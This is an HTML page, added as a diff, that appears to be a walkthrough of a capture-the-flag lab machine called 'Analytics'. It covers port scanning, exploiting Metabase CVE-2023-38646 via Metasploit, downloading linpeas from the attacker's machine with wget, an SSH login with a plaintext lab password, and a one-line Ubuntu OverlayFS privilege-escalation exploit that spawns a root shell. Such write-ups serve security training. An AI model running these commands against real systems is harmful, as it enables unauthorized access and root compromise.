@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width" initial-scale="1.0">
+        <title>Analytics</title>
+        <link rel="stylesheet" href="style3.css">
+    </head>
+    <body>
+        <div class="header-content">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsftl35uZBV9wYNE66Qv44yHgWsTC3ugTLxw&s" alt="Logo" class="logo">
+            <h1>Analytics Reportings</h1>
+            </div>
+            <hr>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*50hoBLRzG_bPXs4VHKiWvg.png">
+            <h2>Enumeration</h2>
+                <p class="script-container">
+                    nmap -sV -sC -p- 10.10.11.233
+                </p>
+                <img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*V3zVy9mqy7e2xFiCLGlf5g.png">
+                <p class="paragraph">
+                    Port 22 (SSH) and port 80 (HTTP) were found to be open.
+                </p>
+                <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*-ma0aD7lDD8ej4KkRPOp2g.png">
+                <p class="paragraph">
+                    As 80 ports were opened, the enumeration was initiated, leading to the discovery of a website<br>hosted on one of them. While viewing the page source, a subdomain, data.analytical.htb,<br>was found where a login page had been hosted.
+                    <p class="script-container">
+                        nano /etc/hosts
+                    </p>
+                </p>
+                <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*t6_Y3bt7JyEp1qXVEYpuaw.png">
+                <p class="paragraph">
+                    The subdomain was added to my attack machine’s /etc/hosts file.
+                </p>
+                <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*MNKuo7mCTfeVuxM2_klkwg.png">
+                <p class="paragraph">
+                    While navigating to the subdomain, a webpage hosting a login form of Metabase was encountered, I started the search for a Metabase vulnerability POC.<br><br>
+                    While searching for Metabase vulnerabilities, it was discovered that it was vulnerable to CVE-2023–38646. After gaining an understanding of the vulnerability,<br>an attempt was made to exploit it using msfconsole.
+                    <p class="script-container">
+                        msfconsole
+                    </p>
+                </p>
+                <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*a5COicASsrCdkWUW5OoNLw.png">
+                <p class="paragraph">
+                    A payload for Metabase was searched for and used to exploit.
+                </p>
+                <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*u6zfh-ZCa9qcT5CvhMvTTQ.png">
+                <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ROIROCe7xowYJkOWWUBf4A.png">
+                <p class="paragraph">
+                    The RPORT should be set to 80, and the RHOST should be set to data.analytical.htb. Additionally, the LHOST should be changed to your VPN IP address.
+                </p>
+                <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*mQNcxA6CkUu0PXWkebTVqQ.png">
+                <p class="paragraph">
+                    After running the payload, the shell of Metabase was successfully obtained. Further enumeration inside the machine was run by using script linpeas.
+                    <p class="script-container">
+                        python3 -m http.server 80
+                    </p>
+                    <p class="script-container">
+                        wget http://<VPN IP>/linpeas.sh
+                    </p>
+                </p>
+                <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*M88608MEEocqrmISldXmhw.png">
+                <p class="paragraph">
+                    The Python server was initiated on the attack machine where linpease was located. Subsequently, within the machine,<br>the home directory of the user “metabase” was accessed, and linpease was downloaded<br>from the attacker machine.
+                    <p class="script-container">
+                        bash linepeas.sh
+                    </p>
+                </p>
+                <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*nRgh_dSOgKFhVKZJjbR6_Q.png">
+                <p class="paragraph">
+                    After analyzing the results of linpeas, the username and password were discovered, and they were employed to log in via SSH.
+                    <p class="script-container">
+                        ssh metalytics@<machine_IP><br><br>
+                        Password: An4lytics_ds20223#
+                    </p>
+                </p>
+                <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*mxHZ2BQ89Tawp9k7lZARww.png">
+                <p class="paragraph">
+                    Using the above credentials, access to the user account was successfully gained.<br><br>
+                    The user flag was located in the home directory of the user.
+                </p>
+                <h2>Privilege Escalation</h2>
+                <p class="paragraph">
+                    For the privilege escalation attempt, linpeas was downloaded onto the machine using a<br>Python server, and the script was executed.<br><br>
+                    While reviewing the results of linpeas, it was discovered that the machine’s version was<br>Ubuntu 22.04.3. The search for vulnerabilities pertaining to this version was initiated.<br><br>
+                    After extensive searching on Google, it was determined that the machine’s version was susceptible<br>to CVE-2023–2640 and CVE-2023–32629.
+                    <p class="script-container">
+                        unshare -rm sh -c "mkdir 1 u w m && cp /u*/b*/p*3 1/; setcap cap_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn("/bin/bash")'
+                    </p>
+                    In my case, CVE-2023–2640 was effective, and root access was obtained.
+                </p>
+                <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*7snL_fo6CKwUJHK8h4yR7g.png">
+                <p class="paragraph">
+                    The root flag was found in the home directory of the root, and, ultimately, the root flag was located.
+                </p>
+    </body>
+    <footer class="footer">
+        <p>&copy; 2024 <a href="https://Iam.Gh0st.Net">Iam.Gh0st.net</a> All rights reserved.</p>
+    </footer>
+</html>
